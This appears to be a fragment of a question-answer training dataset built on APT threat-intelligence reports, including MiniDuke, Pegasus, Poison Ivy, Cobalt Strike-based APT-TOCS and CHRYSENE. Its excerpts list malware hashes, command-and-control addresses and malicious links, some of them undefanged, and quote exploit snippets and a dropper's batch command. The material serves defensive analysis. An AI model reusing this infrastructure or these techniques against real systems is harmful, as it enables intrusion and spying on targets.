aec91b4453a1b321e302127bc9f21a7c f0e64d2b011223ece668c595406f1abc f4123e7f09961479452f0f42b3706293 fb2cb45bf53cef41674da2d9a4bdba32\nAndromeda Domains dvdonlinestore.net eastmedia2112.com mustache-styles.com onlinestoreonsale.com pradahandbagsshoes.com vhideip.com wisheshub.com 99mesotheliomalawyers.com\nVarious Downloader Samples\n2ba1e2a63129517055ab3a63cb089e33 4131776ae573bdb25009a343cf1541f5 44fe2f4dd8b001bbcc4de737128095ca 63ee06dae035981c5aea04f5a52879c1 643e30e665124eea94a22641f79a9c91 67bad4ad3d9a06fc20bea8c3ebb7ad01 7e97efc85be451432388b9f1ce623400 861f621fdf2d3e760df50009fe2824ae a957e3a7aed4efd1b214d3c3b79f5874 c16b43a5897861fbe023e4b7d340f2e8 dbd5c44e6c189f289e0eea1454897b26 e26150f5186bb7230d85f4cf3aa45d17\nPython Downloader Sample 82719f0f6237d3efb9dd67d95f842013\nMeterpreter Samples 04e8404f1173037ba4e11241b141d91d c411ee81c34e14a1ace7e72bea2e8d12 d30c6df94922323041f8036365abbfd2\nMeterpreter C&C\n5.199.170[.]149\nnjRAT Sample\n27ca136850214234bcdca765dfaed79f\nnjRAT C&C\n5.189.145[.]248\nMalicious Documents\n0197ff119e1724a1ffbf33df14411001 18711f1db99f6a6f73f8ab64f563accc 1f82e509371c1c29b40b865ba77d091a 278fd26be39a06d5e19c5e7fd7d3dcc2 3966f669a6af4278869b9cce0f2d9279 438031b9d79a17b776b7397e989dd073 68773f362d5ab4897d4ca217a9f53975 76f410c27d97e6c0403df274bebd5f6e 98bdcd97cd536ff6bcb2d39d9a097319\nUnknown, likely related\n0437655995f4d3104989fb963aa41339 c0ff05a6bf05465adfc9a1dfd5305bde\nUnknown C&C\n5.189.137[.]8\nLuminosity Link Sample\n708a1af68d532df35c34f7088b8e798f\nLuminosity Link C&C\n5.189.145[.]248\nBezigate Samples\n236e7451cbce959ca0f62fb3b499b54e 44db769fb1f29a32d5c1998e29b4b7c4 85d182f7a0e049169a7bd0aa796fba96 96dbed32a59b50e6100f1ca35ef5a698 e49edc719eaab11a40158c15c9dd9b7b\nBezigate C&C\n107.167.93[.]197\n62.4.23[.]46\nad2.admart[.]tv winupdatess.no-ip[.]biz\nDarkComet Samples\n0aecd3b79d72cbfa8f5dce2a12e76053\n278f889f494d62e214406c4fcfa6f9a3\nfd5a419924a0816c6357b47f4e375732\nDarkComet C&C\nad2.admart[.]tv\n107.167.93[.]197\nIntribune.blogspot[.]com Links\nhxxp://intribune.blogspot[.]com/2015/11/4-sikh-army-officers-being-trialed-in.html hxxp://intribune.blogspot[.]com/2015/11/seventh-pay-commission-recommends.html hxxp://bbmsync2727[.]com/cu/seventh%20pay%20commission%20salary%20calculator.xls hxxp://intribune.blogspot[.]com/2015/11/army-air-defenceengineers-and-signal-to.html hxxp://intribune[.]blogspot[.]com/2015/09/sc-seeks-army-response-on-batch-parity.html hxxp://intribune[.]blogspot[.]com/2015/05/seniors-juniors-and-coursemates-please.html hxxp://intribune[.]blogspot[.]com/2015/07/awho-defence-and-para-military-forces.html\nattachment.biz links\nhxxp://ceengrmes[.]attachment[.]biz/?att=1450603943 hxxp://comdtoscc[.]attachment[.]biz/?att=1451926252 hxxp://comdtoscc[.]attachment[.]biz/?att=1453788170 hxxp://fileshare[.]attachment[.]biz/?att=1455255900 hxxp://fileshare[.]attachment[.]biz/?att=1455264091\n\nQ: What are the indicators of compromise (IOCs) associated with the Crimson Downloader samples, and how can these be utilized to detect and mitigate potential threats related to the Crimson APT?",
    "output": "A: The Crimson Downloader Samples include a list of hashes such as '032bacaea0d335daec271f228db6bc88', '052eb62056794a08a04f4cd61455602c', and others. These IOCs can be utilized to detect and mitigate potential threats by incorporating them into security tools such as antivirus software, intrusion detection systems (IDS), and security information and event management (SIEM) systems. By monitoring for these specific hashes, organizations can identify and block attempts to download and execute the Crimson Downloader, thereby preventing further stages of the attack.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does cloud computing present unique security challenges, and what are some of the key technical issues identified in the literature?",
    "output": "Cloud computing presents unique security challenges due to its distributed nature and shared resources. Key technical issues identified in the literature include data security, privacy concerns, and the potential for unauthorized access. Armbrust et al. discuss the various aspects of cloud computing, while Jensen et al. highlight technical security issues such as data breaches, account hijacking, and insufficient due diligence. Mansfield-Devine also points out the dangers associated with cloud computing, emphasizing the need for robust security measures to protect sensitive information.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Overview\nDuring the last weeks, various samples of Uroburos (also named Urob, Turla, Sengoku, Snark and Pfinet) were analyzed and reports have been published 1234, also analyses about a suspected predecessor, Agent.btz, are public 5. CIRCL analyzed an older version of Turla, known as a representative of the Pfinet malware family. The objective of this analysis is to gather additional Indicators of Compromise or behaviors in order to improve detection and to discover additional insights into the malware. This document is not considered a final release but a work-in-progress document.\nAnswer this question: Why is it important for cybersecurity experts to analyze different versions of the Turla malware, such as the older version known as Pfinet? How does this contribute to improving detection capabilities and gaining deeper insights into the malware's behavior?",
    "output": "Analyzing different versions of the Turla malware, including the older version known as Pfinet, is crucial for several reasons. Firstly, it allows cybersecurity experts to gather additional Indicators of Compromise (IoCs), which are essential for identifying and responding to potential threats effectively. By understanding the behaviors and characteristics of various versions, experts can enhance their detection mechanisms, making it easier to identify new variants or related malware. Additionally, this analysis provides deeper insights into the malware's evolution, tactics, techniques, and procedures (TTPs), which can inform the development of more robust defensive strategies. This comprehensive approach helps in staying ahead of the threat landscape and improving overall cybersecurity posture.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nRecent Watering Hole Attacks Attributed to APT Group \"th3bug\" Using Poison Ivy\nWe've uncovered some new data and likely attribution regarding a series of APT watering hole attacks this past summer. Watering hole attacks are an increasingly popular component of APT campaigns, as many people are more aware of spear phishing and are less likely to open documents or click on links in unsolicited emails. Watering hole attacks offer a much better chance of success because they involve compromising legitimate websites and installing malware intended to compromise website visitors. These are often popular websites frequented by people who work in specific industries or have political sympathies to which the actors want to gain access.\nThe attacks discussed in this blog are related to an APT campaign commonly referred to as \"th3bug\", named for the password the actors often use with their Poison Ivy malware. Of note, only the older of the samples we cover in this blog used that password. We don't know the reason the actors changed this, but it could possibly be in reaction to information widely published on the Internet about their activities, which use that password as a key component to tie the activity together. (<http://www.fireeye.com/resources/pdfs/fireeye-poison-ivy-report.pdf>)FireEye in particular published a paper describing several APT campaigns whose activity they correlate using Poison Ivy passwords.\nIn contrast to many other APT campaigns, which tend to rely heavily on spear phishing to gain victims, \"th3bug\" is known for compromising legitimate websites their intended visitors are likely to frequent. Over the summer they compromised several sites, including a well-known Uyghur website written in that native language.\nWhile we were unable to recover the initial vulnerability used, it is possibly the same CVE 2014-0515 Adobe Flash exploit first reported by (<http://blogs.cisco.com/security/far-east-targeted-by-drive-by/>)Cisco TRAC in late July. We cannot confirm the initial compromised sites, but we noted traffic to several known re-direct sites and the malware was configured to use the same command and control (C2) server.\nIn addition, the download dates of many of our files pre-date those noted by Cisco by only a few days. All of the malware were variants of the Poison Ivy Remote Administration Tool (RAT) and were properly identified as such by our WildFire platform. The targets of the attack were:\nUyghur sympathizers\nAn East Asian office for a major US based computer manufacturer\nA major US university\nAn international wholesale and retail telecom provider\nWe saw the first sample on July 14, 2014. This sample had an interesting PDB string \u2013 C:\n\\Users\\sophie\\documents\\visual studio 2010\\Projects\\init\\Release\\init.pdb with a time date string that exactly matched the PE timestamp of 11 July, 2014.\n\nHow did the APT group 'th3bug' adapt their use of the Poison Ivy malware in response to public awareness of their activities? What implications does this adaptation have for cybersecurity experts monitoring similar threats?",
    "output": "The APT group 'th3bug' adapted their use of the Poison Ivy malware by changing the password they typically used with it. Initially, the group was known for using a specific password, which was widely published on the internet and used as a key component to tie their activities together. However, in response to this public awareness, 'th3bug' stopped using this password in newer samples of their malware. This adaptation implies that 'th3bug' is aware of the publicity surrounding their activities and is taking steps to evade detection. For cybersecurity experts, this means that they need to stay vigilant and adapt their monitoring strategies to account for changes in the tactics, techniques, and procedures (TTPs) employed by APT groups.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the GhostNet differ from typical cybercrime networks in terms of its scale and targets? Why might this difference be significant in understanding the motivations behind the attack?",
    "output": "GhostNet differs from typical cybercrime networks primarily due to its relatively small size and the significant concentration of high-value systems it controls. This is unusual because typical cybercrime networks tend to target a larger number of less valuable systems. The focus on high-value targets suggests that the motivation behind GhostNet could be more strategic and politically driven rather than purely financial. This difference is significant because it points towards potential state-sponsored activities aimed at gathering intelligence rather than typical cybercrime activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: (or 'how many cool words can you fit into one title')\nAuthors:\nCostin Raiu, Igor Soumenkov, Kurt Baumgartner, Vitaly Kamluk\nGlobal Research and Analysis Team, Kaspersky Lab\nOn Feb 12th 2013, FireEye announced the discovery () of an Adobe Reader 0-day exploit which is used to drop a previously unknown, advanced piece of malware. We called this new malware \"ItaDuke\" because it reminded us of Duqu and because of the ancient Italian comments in the shellcode copied from Dante Aligheri's Divine Comedy.\nSince the original announcement, we have observed several new incidents using the same exploit (CVE-2013-0640), some of which were so unusual that we decided to analyze them in depth.\nTogether with our partner CrySyS Lab, we've performed a detailed analysis of these new incidents which indicate a new, previously unknown threat actor. For their analysis, please read . For our analysis, please read below.\nFirst of all, while the fake \"Mandiant\" PDF reports (see ) are just dirty hacks of the original exploit, these newer attacks appear to have been created by a 0-day toolkit that was used to build the original \"Visaform Tukey.pdf\" discovered by FireEye.\nThe new PDF attacks drop fake documents that are shown to the victim if the exploit is successfully executed. The documents refer to a human rights seminar (ASEM) and Ukraine's foreign policy and NATO membership plans:\nDocument used against the Hungarian target\nDocument used against the Belgian target\nThe MD5s for the documents used in this attack are:\n3668b018b4bb080d1875aee346e3650a 88292d7181514fda5390292d73da28d4 3f301758aa3d5d123a9ddbad1890853b 0cdf55626e56ffbf1b198beb4f6ed559 cf5a5239ada9b43592757c0d7bf66169 c03bcb0cde62b3f45b4d772ab635e2b0\naction_plan.pdf (Country: Belgium)\nASEM_seminar.pdf (Country: Hungary)\nEUAG_report.pdf (Country: Luxembourg) report.pdf (Country: Spain)\nEUAG_report.pdf (Country: Belgium)\nThe 2013 Armenian Economic Association.pdf (Country: Belgium)\nThe JavaScript exploit code has been modified since the original attack. For instance, the function named \"oTHERWISE\" was renamed to \"q1w2e3r4t\". The function is later called in the code like this:\nNew exploit:\nvar sCIENZA = q1w2e3r4t(vOLENCI[sHOGG('ODNEDNERp',3329,7937)], gIRARSI);\nOlder (\"Visaform Turkey.pdf\") exploit:\nvar sCIENZA = oTHERWISE (vOLENCI['pRENDENDO'], gIRARSI);\nIn addition, the JS code is now in compressed format, while the original sample had it in plaintext. The reason behind the changes is probably to avoid detection by anti-malware products although this doesn't prevent our product from detecting it heuristically as \"HEUR:Exploit.Script.Generic\".\nThe shellcode contained in the PDF document is similar to that used in the documents carrying the \"Itaduke\" payload, with some differences. For instance, after exploiting the vulnerability, it searches for a specific signature within the PDF file. While the \"Itaduke\" shellcode was looking for \"!H2bYm.Sw@\", the MiniDuke version uses a different signature, \"@34fZ7E*p\\\".\nSignature in the Itaduke PDF file\nSignature in the Miniduke PDF file\nOnce the payload signature is found, it is decrypted with XOR and then decompressed using RtlDecompressBuffer API (LZNT1). The resulting PE file is written to a temporary file and loaded using LoadLibary API.\nThe resulting dynamic library implements the second stage of installation. It contains two binary resources, 101 and 102. Resource 101 is the main backdoor DLL component. It is written to the %AppData% directory and loaded using LoadLibary API. Resource 102 is the decoy PDF document. It is written to the Internet cache directory and then opened using a simple BAT file:\nTASKKILL /F /IM acro*\nThe filenames of the dropped files are hardcoded in their resources.\nBeginning of the resource 101 with its filename\nBeginning of the resource 102 with its filename\nInterestingly, the malware dropper contains the following paths:\n\u25cf \"c:\\src\\dlldropper\\Release\\L2P.pdb\".\n\u25cf \"C:\\src\\hellodll\\Release\\hellodll.pdb\".\nThese paths did not exist in the dropper of original PDF (\"Visaform Turkey.pdf\").\nIf we are to trust the PE headers, the dropper was compiled on Feb 20, 2013:\n'Hungarian' dropper compilation time - \"Feb 20 10:51:16 2013\"\nThe backdoor used in the Hungarian case was compiled on \"Feb 20 10:57:52 2013\", just minutes after the dropper was created.\nPerhaps the most unusual thing about these three new attacks is the malware they drop. In all the analyzed cases, the dropped malware is in the form of a 22,528 bytes DLL file. Parts of the malicious DLL file are encrypted with information related to the system configuration, which ensures it will only work properly on the victim's system. If copied to another computer, the malware will be unable to function successfully.\nThe backdoor is written in \"old school\" assembler and is tiny by current standards - only 20 KB. This is most unusual for modern malware, which can be several megabytes in size. It has a small decryptor at the beginning that decrypts the main body. All three cases use different encryption keys. Another peculiarity is that the backdoor has no imports: all functions are scanned from memory and are called dynamically. It is also interesting that the first two Win32 APIs resolved and called by the unpacking stub are ntdll.LdrLoadDll and kernel32.VirtualProtectEx. These two functions are not called according to the \"_stdcall\" convention. Instead, a 'jmp ebx' instruction is executed after manually building the stack. Clearly some thought went into creating anti-emulation and anti-scanning techniques with this malware.\nRead the text above and answer this question: Why did the authors of the APT report 'themysteryofthepdf0-dayassemblermicrobackdoor' decide to call the new malware 'ItaDuke', and what significance does this name hold in relation to other known malware?",
    "output": "The authors named the new malware 'ItaDuke' because it reminded them of Duqu, another sophisticated piece of malware, and because of the ancient Italian comments in the shellcode that were copied from Dante Alighieri's Divine Comedy. This naming highlights the similarities in complexity and potential origins, suggesting that the creators of ItaDuke might be influenced by or connected to the creators of Duqu.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: CHRYSENE\nCHRYSENE is an evolution of on-going activity which initially focused on targets in the Persian or Arabian Gulf  CHRYSENE emerged as an off-shoot to espionage operations \u2013 as well as potential preparation actions before destructive attacks such as SHAMOON10 \u2013 that focused mostly on the Gulf area generally,  and Saudi Arabia specifically  CHRYSENE differs from past activity in that it utilizes a unique variation of a malware framework employed by other groups such as Greenbug (Symantec) and OilRig (Palo Alto Networks), with a very particular C2 technique reliant upon IPv6 DNS and the use of 64-bit malware\nWhere CHRYSENE mostly differentiates itself is in targeting: all observed CHRYSENE activity focuses on Western Europe, North America, Iraq, and Israel  CHRYSENE targets oil and gas and electric generation industries primarily within these regions  This activity first emerged in mid-2017 and has continued at a steady state since\nWhile CHRYSENE's malware features notable enhancements over related threat groups using similar tools, Dragos has not yet observed an ICS-specific capability employed by this activity group. Instead, all activity thus far appears to focus on IT penetration and espionage, with all targets being ICS-related organizations. Although CHRYSENE conducts no known ICS disruption, the continued activity and expansion in targeting make this group a concern that Dragos continues to track.\n10 (<http://www.nytimes.com/2012/10/24/business/global/cyberattack-on-saudi-oil-firm-disquiets-us.html>)http://www.nytimes.com/2012/10/24/business/global/cyberattack-on-saudi-oil-firm-disquiets-us.html\nDRAGOS began tracking MAGNALLIUM in response to public reporting by  another security company on a group identified as 'APT33' (FireEye) The press initially treated MAGNALLIUM as a significant threat to ICS and critical infrastructure  A subsequent investigation by Dragos indicated that all of this group's activity focused on Saudi Arabia, specifically government-run or -owned enterprises in petrochemicals  and the  aerospace industry\nWhile the group targets organizations which contain ICS, the lack of an ICS-specific capability combined with the group's very narrow targeting profile make this less of a concern\nWe continue to monitor MAGNALLIUM to determine if targeting changes, or if this group's actions splinter resulting in new, 'out of area' operations, as observed with CHRYSENE.\n\nWhat are the key characteristics of CHRYSENE's malware and command and control (C2) techniques, and how do they compare to those used by related threat groups?",
    "output": "CHRYSENE employs a unique variation of a malware framework used by other groups such as Greenbug (Symantec) and OilRig (Palo Alto Networks). Its malware features notable enhancements, including the use of 64-bit malware and a very particular C2 technique reliant upon IPv6 DNS. These characteristics set CHRYSENE apart from related threat groups, indicating a higher level of sophistication and adaptation. However, despite these advancements, CHRYSENE's activities have so far been limited to IT penetration and espionage without demonstrating any ICS-specific capabilities. This underscores the need for defenders to stay vigilant and adapt their strategies to counter evolving threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 7.1. Mexico: Politically Motivated Targeting?\nIn the case of Mexico, one target appears to be the journalist Rafael Cabrera, who recently (<http://www.icfj.org/news/investigative-journalists-uncover-corruption-latin-america>)reported on the (<http://aristeguinoticias.com/0911/mexico/la-casa-blanca-de-enrique-pena-nieto/>)Casa Blanca controversy, a reported conflict of interest involving the President and First Lady of Mexico. On August 30, 2015 the journalist Cabrera (<https://twitter.com/raflescabrera/status/638057388180803584>)tweeted that he had received suspicious messages purporting to come from Mexican television station (<http://www.unotv.com/noticias/>)UNO TV. His tweet included screencaptures of the messages, which said that Mexico's Presidency was considering defamation claims and imprisonment of reporters related to the Casa Blanca report that Cabrera had worked on.\nThe English translations of the messages are as follows:\nUNOTV.COM/ THE PRESIDENT'S OFFICE WILL SUE FOR DEFAMATION THOSE WHO PUBLISH REPORTING ON CASA BLANCA. NOTE: [MALICIOUS LINK]\nUNOTV.COM/ ON THE TOPIC OF THE CASA BLANCA, THE PRESIDENCY COULD INCARCERATE REPORTERS WHILE THEY LOOK INTO THE NAMES: [MALICIOUS LINK]\nThe links in the screenshots expand to http://fb-accounts.com/1074139s/ and http://unonoticias.net/3423768s/. These match two domain names we linked to the apparent NSO Group infrastructure. A director at UNO TV (<https://twitter.com/ELSABRIS/status/638088632297893888>)responded to Cabrera's Tweet, saying that these were \"\u2026not our messages 100%.\"\nWe were unable to achieve a successful infection from either link sent to Cabrera, presumably because the links were several months old when we found them, and had been clicked on either by Cabrera himself, or by other interested parties who saw Cabrera's tweet.\nContinuing our investigation, we made contact with Cabrera and learned that he had been recently targeted with an additional series of messages containing suspicious links.\nFigure 20: Additional SMS messages sent to Rafael Cabrera containing links to the exploit infrastructure. Screenshots courtesy of Rafael Cabrera.\nThe English translations of the messages are as follows (clockwise from top-left):\nFacebook reports efforts to access the account of: Rafael Cabrara. Avoid account blockage, Verify at: [MALICIOUS LINK]\nUNOTV.COM/ CARMEN ARISTEGUI MAY RUN AS AN INDEPENDENT CANDIDATE IN 2018. DETAILS: [MALICIOUS LINK]\nTELCEL.COM/. DEAR CLIENT WE REMIND YOU THAT YOU HAVE AN OUTSTANDING DEBT OF $8,854.90 IN NATIONAL CURRENCY. TO VERIFY DETAILS [MALICIOUS LINK]\n[CL Note: this message contains highly profane sexual taunts, followed by a malicious link]\nThe fourth message is most noteworthy, as it contained profane and personal sexual taunts, unlike the other messages. Each of these messages contained a link that would have led, we believe, to the infection of his iPhone with NSO Group's Pegasus spyware via the Trident exploit.\nSimilar SMS messages (<http://www.abajolosmuros.org/index.php/noticias-anticarcelarias/456-campana-de-intimidacion-y-amenazas-contra-individuxs-anarquistas>)have also been reported in other online posts from Mexico.\nBig Headline: 8. Ahmed Mansoor and Previous UAE Attacks\nIn this section, we provide an overview of previous attacks we have documented against Ahmed Mansoor, and other UAE dissidents. The technical sophistication of previous attacks we observed pales in comparison to the present attack.\nAhmed Mansoor has been a frequent target of past electronic attacks. In March 2011, he was targeted with FinFisher spyware disguised as a PDF of a pro-democracy petition he had previously signed. The spyware arrived in the form of an executable file inside a .rar file attached to an email. Mansoor noticed that the file was an EXE file rather than a PDF, and did not open it. Mansoor and four other activists (the \"UAE Five\") (<https://en.wikipedia.org/wiki/UAE_Five>)were imprisoned in April 2011, and charged with insulting the leaders of the UAE. Mansoor and the others were pardoned in November of the same year.\nIn July of 2012, Ahmed Mansoor's laptop (<https://citizenlab.org/2012/10/backdoors-are-forever-hacking-team-and-the-targeting-of-dissent/>)was infected with Hacking Team spyware delivered via a booby-trapped Microsoft Word document exploiting an old Microsoft Office vulnerability, CVE 2010-3333. The spyware sent information from his computer to a UAE intelligence agency, apparently operating under the auspices of the office of Sheikh Tahnoon bin Zayed al-Nahyan, a son of the founder of the UAE, and now the UAE Deputy National Security Advisor. Attackers broke into Mansoor's email account shortly after the infection. We assisted Mansoor in recovering from the attack. Another UAE-based human rights activist, and a UAE-based journalist were also targeted in the same operation.\nIn early 2013, Mansoor was sent a link to a website that attempted to install spyware on his computer by exploiting a public Java vulnerability for which no patch had yet been issued. He (<https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-marczak.pdf>)realized the link was suspicious and did not click on it. Throughout 2013 and 2014, Mansoor was unsuccessfully targeted several times with spyware, mostly XTremeRAT, SpyNet RAT, and njRAT delivered as executable files in attachments or through Google Drive links. In 2014, Mansoor's .\nIn a campaign stretching from 2012 until 2016, UAE dissidents at home and abroad were targeted by (<https://citizenlab.org/2016/05/stealth-falcon/>)Stealth Falcon, an attacker likely linked to a UAE government agency. Stealth Falcon sent out links involving a fake URL shortener that employed Javascript to profile targets' computers, checked which antivirus programs they had installed, and attempted to deanonymize them if they were using Tor. Stealth Falcon also sent out Microsoft Word documents containing custom spyware that was installed if a user enabled macros. Targets included five dissidents who were later arrested or convicted in absentia, as well as Rori Donaghy, a UK-based journalist who had been publishing articles about leaked emails involving members of the UAE government.\nQ: How did the attackers attempt to exploit Rafael Cabrera's trust in order to deliver the Pegasus spyware, and what specific techniques were used in the SMS messages sent to him?",
    "output": "The attackers attempted to exploit Rafael Cabrera's trust by sending SMS messages that appeared to come from legitimate sources, such as UNO TV and Telcel. The messages contained links that would lead to the infection of his iPhone with NSO Group's Pegasus spyware via the Trident exploit. Specific techniques used in the messages included: (1) claiming that the Presidency was considering defamation claims and imprisonment of reporters related to the Casa Blanca report, (2) suggesting that Facebook required account verification to avoid blockage, (3) reporting on political news about Carmen Aristegui potentially running as an independent candidate, and (4) sending a message with profane and personal sexual taunts. Each message contained a malicious link designed to infect the target's device.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "of Social Science degree from Helsinki University; and an Officer's degree from the National Defense University. Limn\u00e9ll served many years as an officer in the Finnish Defense Forces, and has worked as a Director of Cybersecurity at McAfee. His most recent book is Cybersecurity for Decision Makers.\nTim Maurer is the Director of the Global Cybersecurity Norms and Resilience Project, and Head of Research at New America's Cybersecurity Initiative. He is part of New America's Future of War project and serves as a member of the Research Advisory Network of the Global Commission on Internet Governance, the Freedom Online Coalition's cybersecurity working group \"An Internet Free and Secure\", and was co-chair of the Advisory Board for the Global Conference on Cyberspace. He holds a Master in Public Policy concentrating on international and global affairs from the Harvard Kennedy School.\nGlib Pakharenko (CISA, CISSP) is an IT security specialist, board member for the OWASP and ISACA Kyiv chapters, forum moderator, and the conference organizer for the largest information security community of Ukraine, the Ukrainian Information Security Group. Glib has over 10 years of IT security experience in financial, telecom, media, and other industries. He actively supports the reform and modernization of Ukrainian national cyber security policies, and reviews technical and IT security translations into the Ukrainian language.\nLiisa Past is a NATO CCD COE adviser and spokesperson, with academic interests in political communication, argumentation, and discourse analysis. Educated at Columbia University, the University of Oslo, and Tartu University, Liisa has taught at numerous institutions of higher education, and worked with companies, organizations, and a political party on strategic communication and public relations. As an activist, she has contributed to human rights causes and has worked with the International Debate Education Association, Estonian Debating Society, and Baltimore Urban Debate League.\nHenry R\u00f5igas is a researcher in the Law and Policy Branch at NATO CCD COE, studying policy matters such as state interest in global cyber diplomacy, international norm development, the role of international organisations, and the cyber security posture of small states. He is the Project Manager of the Ukraine case study book and the Centre's INCYDER (International Cyber Developments Review) database. Henry holds a Master's degree in International Relations from the University of Tartu.\nJan Stinissen is a military lawyer in the Netherlands Army with the rank of Lieutenant Colonel. He served as a military lawyer for more than 20 years in different positions in The Netherlands and in Germany. He was deployed as a Legal Advisor\nwith NATO missions abroad. Most recently, Lt Col Stinissen worked as a Researcher with the Law and Policy Branch at the NATO CCD COE in Tallinn, Estonia. He holds a Master in Law degree from the University of Utrecht, The Netherlands.\nSanda Svetoka is a Senior Expert at the NATO Strategic Communications Centre of Excellence (NATO StratCom COE) in Riga, Latvia, where she is the project leader for StratCom's study on how social media are used as a weapon in hybrid warfare. From 2004-2005, she worked as a news reporter at the Latvian information agency LETA. In 2005, she joined the Latvian Ministry of Defence, where she coordinated Latvian cooperation with NATO partner countries. In 2010-2011, Ms Svetoka was Public Relations Advisor to the NATO Advisory Team in Kosovo. From 2011-2014, she served as a Press Officer at the Military Public Relations Department of the Latvian Ministry of Defence. Ms Svetoka holds an MA in Political Science from the University of Latvia.\nJen Weedon is a strategic threat intelligence analyst and cyber risk management consultant at FireEye. Jen played a key role in building out Mandiant's intelligence team and contributed to Mandiant's landmark APT1 report, linking a long-running cyber espionage effort to a Chinese military unit. She worked on the cyber espionage and hacktivist portfolios at iSIGHT Partners. Prior to that, Jen analyzed and briefed policymakers on Russia's intents and motivations in cyberspace for the U.S. defense community. She is a graduate of the Fletcher School of Law and Diplomacy (2008) and Smith College (2002), was awarded a Fulbright Fellowship in Ukraine (2002-2003), and is an inaugural fellow for Foreign Policy Interrupted (2015).\nProfessor James J. Wirtz is Dean, School of International Graduate Studies at the U.S. Naval Postgraduate School in Monterey, California. He is editor of the Palgrave Macmillan series, Initiatives in Strategic Studies: Issues and Policies, and a past president of the International Security and Arms Control Section of the American Political Science Association. In 2005, he was a Visiting Professor at the Center for International Security and Cooperation, Stanford University. Between 2009 and 2014 he served as the Director of the Global Center for Security Cooperation, Defense Security Cooperation Agency. His work on intelligence, deterrence, the Vietnam War, and military innovation and strategy has been widely published in academic journals. Professor Wirtz is a graduate of Columbia University (MPhil 1987, PhD 1989), the University of Delaware (MA 1983, BA 1980), and was a John M. Olin Pre-Doctoral Fellow at the Center for International Affairs, Harvard University.\n\nBased on the above text, answer a question. How does the background and expertise of individuals like Glib Pakharenko contribute to the understanding and advancement of cybersecurity policies and practices in Ukraine?",
    "output": "Glib Pakharenko, with his CISA and CISSP certifications, brings over 10 years of IT security experience across various industries including finance, telecom, and media. His active involvement in the Ukrainian Information Security Group and his efforts in reviewing technical and IT security translations into Ukrainian significantly support the reform and modernization of Ukrainian national cybersecurity policies. This expertise ensures that cybersecurity measures are tailored to local needs and effectively communicated.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: 2.1 Leading files and sample downloading\nAPT-TOCS used \"powershell.exe\" to execute Shellcode scripts to realize remote control on targeted system. The analysts of Antiy thought that the attacker might know several remote injection methods of script downloading privilege, such as directly making the scrip be executed on the host by using security vulnerabilities. Meanwhile, we found the following binary leading attack files (hereinafter referred to as Sample A) were used in similar attacks before:\nThe functionality code of the scripts embedded in this PE sample is completely the same with the one of Shellcode script Antiy has acquired, while the encryption data of them differs from each other. This PE sample was firstly uploaded to Virustotal on May 2, 2015:\nThe PE sample used WinExec to operate embedded malware:\nTherefore, we can see that the \"leading file\" can be regarded as the leading part of attack. However, the execution and control still can be made depending on system and application vulnerabilities without this leading file.\nAccording to above information, we cannot make sure this leading sample has relationship with this APT incident.\nMedium Headline: 2.7 Analysis on module 3\nThe module might connect the following 2 addresses with port 80:\n\uf06c\ndc.******69.info (146.0.***.***) (Romania)\nSending request data and receiving return data.\nThe decryption to above IP, domains and accessing addresses is \"XOR 0x69\".\nJudging from the module strings and the system functions, the module belongs to backdoor program that can send GET request to designated addresses and heartbeat packages by using Cookie fields with 60 seconds' interval. The heartbeat package data includes: check code, process ID, system version, IP address, computer name, account, whether it is 64 bit process. Then it transmits by making use of both RSA and BASE64 encryption.\nAs the process ID and check code are different, the transmitted heartbeat package data are different each time. The check code is calculated through using process ID and the millisecond process during system startup. The algorithm is as follows:\nThe encrypted heartbeat package used Cookie field to transmit:\nBig Headline: 3 The authentication analysis on the technology sources of this attack\nThe leading PE files, Sample_A and Sample B, associated by analysts of Antiy CERT used the exactly same method of PowerShell. However, we cannot eliminate the possibility that Sample_A has no positive connection with this attack due to the high standardization of relevant scripts. We still consider it as a series of attack incidents based on other comprehensive analysis. The attacker might exploit the following ways to control the target host, such as social engineering e-mails, file bundling, exploiting system and application vulneratbilities, lateral\nmovement of intranet and so on.\nWe found \"Beacon\" strings when analyzing \"Module 1\". According to existed experience, we doubted that Shellcode is closely related with automatic attack testing platform Cobalt Strike. Therefore, our analysts carried out comparison analysis on Beacon generated by Cobalt Strike, and authenticated the relationships between them.\nCobalt Strike is the GUI framework penetration tool based on metasploit. The business version of it integrates the following characteristics: service scan, automatic overflow, multi-mode port espionage, various Trojan generation, phishing attack, site clone, target information obtaining, automatic browser attack and so on.\nMedium Headline: 3.4 Characteristics of Cobalt Strike\nUsing Cobalt Strike attack can execute various operations in the targeted systems, such as downloading and uploading files, executing designated programs, injecting keyboard recorder, executing commands via PowerShell, importing PowerShell script, executing commands via CMD, accessing system passwords and so on.\nCobalt Strike has the following characteristics:\n\uf06c Penetrating sandbox\n\uf06c Avoiding whitelist mechanism and cloud detection\n\uf06c Intranet penetration\n\uf06c Persistent attacks\n\uf06c Attacking various platforms\nBig Headline: 4 Conclusion\nWith an automated test platform Cobalt Strike, the attack penetration can penetrate firewall, the approach the attackers used to control targeted host is covert and undetectable; what's more, it can attack various platforms, such\nas Windows, Linux, Mac etc.; it's formidable adversary to Trusted Computing, Cloud Detection, Sandbox Detection and so on. According to the traces in the past, we believe that the threat has been active for 5 years; unfortunately, there isn't any powerful detection production and methods to defeat the malicious attack till now.\nThe reason why the CERT Analysis Team of ANTIY classified APT-TOCS into APT incidents is that it's a kind of targeted attack (one of the features of APT attack), it has anti-detection functions and also it can conceal itself. Compared with APT incidents in the past, the APT attack in this case doesn't cost too much, and the attackers aren't responsible for coding. With the application of commercial attack platform, the attackers saved the cost of an attack, also the vulnerability built joint function provided by relevant attack platform make the attackers easy to do injection. As a result, nations and organizations which without its own elite hacker groups and abundant capital can also launch some kind of APT attack via the attack pattern mentioned in this 